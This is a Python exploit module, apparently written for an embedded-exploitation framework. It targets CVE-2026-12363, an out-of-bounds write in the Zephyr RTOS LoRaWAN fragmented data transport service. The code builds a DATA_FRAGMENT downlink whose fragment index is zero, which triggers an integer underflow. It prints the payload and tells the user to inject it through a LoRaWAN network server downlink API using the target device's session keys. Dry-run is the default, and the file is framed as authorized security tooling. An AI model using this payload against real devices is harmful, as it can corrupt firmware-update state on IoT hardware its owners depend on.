"""LoRaWAN Zephyr Fragmented Transport OOB Write (CVE-2026-12363).

The LoRaWAN Fragmented Data Block Transport service in Zephyr RTOS
(subsys/lorawan/services/frag_transport.c) does not validate frag_counter
before passing it to FragDecoderProcess().  A frag_counter of 0 causes an
underflow (0 - 1 → 0xFFFF as uint16), writing a zero word out-of-bounds
into the FUOTA session state (CWE-787).

Affected: Zephyr RTOS 3.7.0 to 4.4.x
Fixed in: commit 452c704a (zephyrproject-rtos/zephyr)
CVSS: 7.5 High

Original research / PoC credits
--------------------------------
CVE     : CVE-2026-12363
GHSA    : GHSA-fvm7-7whg-8gj6
CVSS    : 7.5 (High)
Source  : WirelessXPL-Forge wirelessxpl/modules/generic/iot_proto/lorawan/
          lorawan_frag_transport_oob_cve_2026_12363.py

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

import socket
import struct

from embedxpl.core.exploit import *


_CVE = "CVE-2026-12363"
_GHSA = "GHSA-fvm7-7whg-8gj6"

# LoRaWAN DATA_FRAGMENT downlink CID
_DATA_FRAGMENT_CID = 0x08


def _build_frag_fragment_zero(app_session_cnt: int = 1, dev_addr: bytes = b"\xDE\xAD\xBE\xEF") -> bytes:
    """Build a minimal DATA_FRAGMENT downlink with frag_index_n = 0 (triggers OOB)."""
    # LoRaWAN application layer: Fragmentation Transport Layer Command
    # Header: SessionCnt(7b) + FragmentIndex(14b) | 0 triggers the underflow
    session_cnt = (app_session_cnt & 0x7F) << 1
    frag_index_n = 0  # This triggers the OOB write in Zephyr
    # Build minimal payload: CID(1) + Header(2) + dummy data(4)
    header_word = (session_cnt << 14) | (frag_index_n & 0x3FFF)
    payload = struct.pack(">BH4s", _DATA_FRAGMENT_CID, header_word, b"\x00" * 4)
    return payload


class Exploit(Exploit):
    """LoRaWAN Zephyr frag_transport OOB Write (CVE-2026-12363)."""

    __info__ = {
        "name": "LoRaWAN Zephyr frag_transport OOB (CVE-2026-12363)",
        "description": (
            "Zero frag_counter underflow in Zephyr RTOS LoRaWAN frag_transport service. "
            "A DATA_FRAGMENT downlink with frag_index_n=0 causes OOB write into FUOTA "
            "session state. Requires MAC session keys and active fragmentation session. "
            "CVSS 7.5 (High). Fixed: Zephyr commit 452c704a."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            f"https://github.com/zephyrproject-rtos/zephyr/security/advisories/{_GHSA}",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-12363",
        ),
        "devices": ("Zephyr RTOS 3.7.0-4.4.x with LoRaWAN frag transport",),
    }

    dry_run = OptBool(True, "Dry run — show payload only")
    session_cnt = OptInteger(1, "LoRaWAN fragmentation session counter")

    @mute
    def check(self) -> bool:
        return True

    def run(self) -> None:
        dry_run = bool(self.dry_run)
        sc = int(self.session_cnt)

        payload = _build_frag_fragment_zero(app_session_cnt=sc)
        print_status(f"LoRaWAN frag_transport OOB probe — {_CVE}")
        print_info(f"Payload ({len(payload)} bytes): {payload.hex()}")
        print_info("frag_index_n=0 triggers underflow (0-1=0xFFFF) → OOB write in MatrixM2B")

        if dry_run:
            print_info(
                "DRY-RUN: Payload built but not sent. Transmission requires: "
                "LoRaWAN network server access + valid MAC session keys for the target device. "
                "Send via chirpstack API or directly via LNS downlink queue."
            )
        else:
            print_warning(
                f"Live mode for {_CVE}: requires authenticated LoRaWAN downlink path. "
                "Inject payload via LoRaWAN Network Server downlink API with target DevEUI."
            )
